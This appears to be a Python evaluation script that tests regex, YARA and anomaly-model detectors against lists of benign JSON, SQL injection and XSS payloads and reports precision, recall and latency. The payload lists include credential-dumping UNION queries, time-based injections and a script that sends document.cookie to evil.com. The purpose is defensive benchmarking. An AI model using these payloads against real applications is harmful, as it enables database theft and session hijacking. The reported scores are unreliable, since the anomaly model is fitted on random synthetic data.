#!/usr/bin/env python3
"""
Evaluation script for API Security Analyzer
Tests detection performance against various attack payloads
"""

import json
import re
import time
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from collections import defaultdict, deque
import sys

# Import YARA if available
try:
    import yara
    yara_available = True
except Exception:
    yara = None
    yara_available = False

# ==================== DETECTION FUNCTIONS ====================

# Regex patterns (same as main.py)
sqli_pat = re.compile(r"union.*select|drop.*table|exec.*sp", re.I)
xss_pat = re.compile(r"<script|javascript:|alert\(", re.I)

# YARA rules
if yara_available:
    rules = yara.compile(source=r'''
rule SQLi {
    meta:
        description = "SQL Injection"
    strings:
        $sqli = /union.*select/i
    condition:
        $sqli
}

rule XSS {
    meta:
        description = "XSS"
    strings:
        $xss = /<script|javascript:|alert\(/i
    condition:
        $xss
}
''')
else:
    rules = None

# ML Model (same as main.py)
scaler = StandardScaler()
model = IsolationForest(contamination=0.1, random_state=42)
normal_requests = np.random.rand(100, 4)
normal_requests[:, 0] = np.random.normal(50, 20, 100)
normal_requests[:, 1] = np.random.normal(4, 1, 100)
normal_requests[:, 2] = np.random.normal(3.5, 0.5, 100)
normal_requests[:, 3] = np.random.poisson(5, 100)
scaler.fit(normal_requests)
model.fit(scaler.transform(normal_requests))

def calculate_entropy(s):
    """Calculate Shannon entropy of a string"""
    if len(s) == 0:
        return 0.0
    counts = np.unique(list(s), return_counts=True)[1]
    freqs = counts / len(s)
    return -np.sum([p * np.log(p + 1e-10) for p in freqs])

def detect_regex(payload):
    """Regex-based detection"""
    issues = []
    if sqli_pat.search(payload):
        issues.append("SQLi")
    if xss_pat.search(payload):
        issues.append("XSS")
    return issues

def detect_yara(payload):
    """YARA-based detection"""
    if rules is None:
        return []
    try:
        matches = rules.match(data=payload)
        return [m.rule for m in matches]
    except:
        return []

def detect_ml(payload, num_params=1, rate=1):
    """ML-based anomaly detection"""
    L = len(payload)
    entropy = calculate_entropy(payload)
    
    features = np.array([[L, num_params, entropy, rate]]).reshape(1, -1)
    features_scaled = scaler.transform(features)
    anomaly_score = model.decision_function(features_scaled)[0]
    is_anomaly = model.predict(features_scaled)[0] == -1
    
    return is_anomaly, anomaly_score

def full_analysis(payload, num_params=1, rate=1):
    """Complete analysis combining all methods"""
    regex_issues = detect_regex(payload)
    yara_issues = detect_yara(payload)
    is_anomaly, score = detect_ml(payload, num_params, rate)
    
    all_issues = regex_issues + yara_issues
    if is_anomaly:
        all_issues.append("ML_Anomaly")
    
    return all_issues, score

# ==================== TEST DATA ====================

LEGITIMATE_PAYLOADS = [
    '{"username": "john", "email": "john@example.com"}',
    '{"name": "Product", "price": 29.99, "category": "electronics"}',
    '{"search": "laptop", "filters": {"brand": "Dell", "min_price": 300}}',
    '{"action": "get_user", "id": 12345}',
    '{"data": {"items": ["a", "b", "c"], "count": 3}}',
    '{"username": "alice", "password": "secret123"}',
    '{"query": "SELECT * FROM products WHERE id = 5"}',
    '{"comment": "I love this product! <3"}',
    '{"bio": "Developer & Engineer"}',
    '{"title": "Mr.", "name": "John O\'Brien"}',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT NULL--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 1=1--",
    "1; EXEC sp_executesql N'sp_who'",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' UNION SELECT username,password FROM users--",
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' UNION ALL SELECT NULL,NULL,NULL--",
    "' OR 1=1 LIMIT 1--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "error=alert(<img src=x on1)>",
    "<svg onload=alert(1)>",
    "';alert(1);//",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "eval('alert(1)')",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<img src=\"javascript:alert(1)\">",
    "<link rel=import href=\"javascript:alert(1)\">",
    "<div onclick=\"alert(1)\">test</div>",
    "<iframe src=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
]

# ==================== EVALUATION ====================

def evaluate():
    print("=" * 60)
    print("API SECURITY ANALYZER - EVALUATION REPORT")
    print("=" * 60)
    print()
    
    # Track results
    results = {
        'regex': {'tp': 0, 'fp': 0, 'tn': 0, 'fn': 0},
        'yara': {'tp': 0, 'fp': 0, 'tn': 0, 'fn': 0},
        'ml': {'tp': 0, 'fp': 0, 'tn': 0, 'fn': 0},
        'combined': {'tp': 0, 'fp': 0, 'tn': 0, 'fn': 0},
    }
    
    latencies = {'regex': [], 'yara': [], 'ml': [], 'combined': []}
    
    # Test legitimate payloads
    print(f"Testing {len(LEGITIMATE_PAYLOADS)} legitimate payloads...")
    for payload in LEGITIMATE_PAYLOADS:
        # Regex
        start = time.perf_counter()
        regex_issues = detect_regex(payload)
        latencies['regex'].append((time.perf_counter() - start) * 1000)
        is_attack = len(regex_issues) > 0
        if is_attack:
            results['regex']['fp'] += 1
        else:
            results['regex']['tn'] += 1
        
        # YARA
        start = time.perf_counter()
        yara_issues = detect_yara(payload)
        latencies['yara'].append((time.perf_counter() - start) * 1000)
        is_attack = len(yara_issues) > 0
        if is_attack:
            results['yara']['fp'] += 1
        else:
            results['yara']['tn'] += 1
        
        # ML
        start = time.perf_counter()
        is_anomaly, _ = detect_ml(payload)
        latencies['ml'].append((time.perf_counter() - start) * 1000)
        if is_anomaly:
            results['ml']['fp'] += 1
        else:
            results['ml']['tn'] += 1
        
        # Combined
        start = time.perf_counter()
        all_issues, _ = full_analysis(payload)
        latencies['combined'].append((time.perf_counter() - start) * 1000)
        is_attack = len(all_issues) > 0
        if is_attack:
            results['combined']['fp'] += 1
        else:
            results['combined']['tn'] += 1
    
    # Test SQLi payloads
    print(f"Testing {len(SQLI_PAYLOADS)} SQLi payloads...")
    for payload in SQLI_PAYLOADS:
        # Regex
        start = time.perf_counter()
        regex_issues = detect_regex(payload)
        latencies['regex'].append((time.perf_counter() - start) * 1000)
        detected = len(regex_issues) > 0
        if detected:
            results['regex']['tp'] += 1
        else:
            results['regex']['fn'] += 1
        
        # YARA
        start = time.perf_counter()
        yara_issues = detect_yara(payload)
        latencies['yara'].append((time.perf_counter() - start) * 1000)
        detected = 'SQLi' in yara_issues
        if detected:
            results['yara']['tp'] += 1
        else:
            results['yara']['fn'] += 1
        
        # ML
        start = time.perf_counter()
        is_anomaly, _ = detect_ml(payload)
        latencies['ml'].append((time.perf_counter() - start) * 1000)
        if is_anomaly:
            results['ml']['tp'] += 1
        else:
            results['ml']['fn'] += 1
        
        # Combined
        start = time.perf_counter()
        all_issues, _ = full_analysis(payload)
        latencies['combined'].append((time.perf_counter() - start) * 1000)
        detected = len(all_issues) > 0
        if detected:
            results['combined']['tp'] += 1
        else:
            results['combined']['fn'] += 1
    
    # Test XSS payloads
    print(f"Testing {len(XSS_PAYLOADS)} XSS payloads...")
    for payload in XSS_PAYLOADS:
        # Regex
        start = time.perf_counter()
        regex_issues = detect_regex(payload)
        latencies['regex'].append((time.perf_counter() - start) * 1000)
        detected = len(regex_issues) > 0
        if detected:
            results['regex']['tp'] += 1
        else:
            results['regex']['fn'] += 1
        
        # YARA
        start = time.perf_counter()
        yara_issues = detect_yara(payload)
        latencies['yara'].append((time.perf_counter() - start) * 1000)
        detected = 'XSS' in yara_issues
        if detected:
            results['yara']['tp'] += 1
        else:
            results['yara']['fn'] += 1
        
        # ML
        start = time.perf_counter()
        is_anomaly, _ = detect_ml(payload)
        latencies['ml'].append((time.perf_counter() - start) * 1000)
        if is_anomaly:
            results['ml']['tp'] += 1
        else:
            results['ml']['fn'] += 1
        
        # Combined
        start = time.perf_counter()
        all_issues, _ = full_analysis(payload)
        latencies['combined'].append((time.perf_counter() - start) * 1000)
        detected = len(all_issues) > 0
        if detected:
            results['combined']['tp'] += 1
        else:
            results['combined']['fn'] += 1
    
    # ==================== PRINT RESULTS ====================
    
    print()
    print("=" * 60)
    print("DETECTION PERFORMANCE BY MECHANISM")
    print("=" * 60)
    
    for mech, r in results.items():
        tp, fp, tn, fn = r['tp'], r['fp'], r['tn'], r['fn']
        total = tp + fp + tn + fn
        
        precision = tp / (tp + fp) * 100 if (tp + fp) > 0 else 0
        recall = tp / (tp + fn) * 100 if (tp + fn) > 0 else 0
        f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
        accuracy = (tp + tn) / total * 100
        
        print(f"\n{mech.upper()} Detection:")
        print(f"  True Positives:  {tp}")
        print(f"  False Positives: {fp}")
        print(f"  True Negatives:  {tn}")
        print(f"  False Negatives: {fn}")
        print(f"  Precision:       {precision:.1f}%")
        print(f"  Recall:          {recall:.1f}%")
        print(f"  F1-Score:        {f1:.1f}%")
        print(f"  Accuracy:        {accuracy:.1f}%")
    
    print()
    print("=" * 60)
    print("LATENCY BENCHMARKS (milliseconds)")
    print("=" * 60)
    
    for mech, times in latencies.items():
        times_sorted = sorted(times)
        p50 = times_sorted[int(len(times_sorted) * 0.50)]
        p95 = times_sorted[int(len(times_sorted) * 0.95)]
        p99 = times_sorted[int(len(times_sorted) * 0.99)]
        print(f"\n{mech.upper()}:")
        print(f"  P50: {p50:.2f}ms")
        print(f"  P95: {p95:.2f}ms")
        print(f"  P99: {p99:.2f}ms")
    
    # Summary for README
    print()
    print("=" * 60)
    print("SUMMARY FOR README")
    print("=" * 60)
    print()
    print("## Test Dataset")
    print(f"- Legitimate Requests: {len(LEGITIMATE_PAYLOADS)}")
    print(f"- SQLi Attacks: {len(SQLI_PAYLOADS)}")
    print(f"- XSS Attacks: {len(XSS_PAYLOADS)}")
    print(f"- Total: {len(LEGITIMATE_PAYLOADS) + len(SQLI_PAYLOADS) + len(XSS_PAYLOADS)}")
    print()
    
    # Combined metrics
    r = results['combined']
    precision = r['tp'] / (r['tp'] + r['fp']) * 100 if (r['tp'] + r['fp']) > 0 else 0
    recall = r['tp'] / (r['tp'] + r['fn']) * 100 if (r['tp'] + r['fn']) > 0 else 0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
    
    print("## Combined System Performance")
    print(f"- Precision: {precision:.1f}%")
    print(f"- Recall: {recall:.1f}%")
    print(f"- F1-Score: {f1:.1f}%")
    print()
    
    times = latencies['combined']
    times_sorted = sorted(times)
    print("## Latency")
    print(f"- P50: {times_sorted[int(len(times_sorted) * 0.50)]:.2f}ms")
    print(f"- P95: {times_sorted[int(len(times_sorted) * 0.95)]:.2f}ms")
    print(f"- P99: {times_sorted[int(len(times_sorted) * 0.99)]:.2f}ms")

if __name__ == "__main__":
    evaluate()

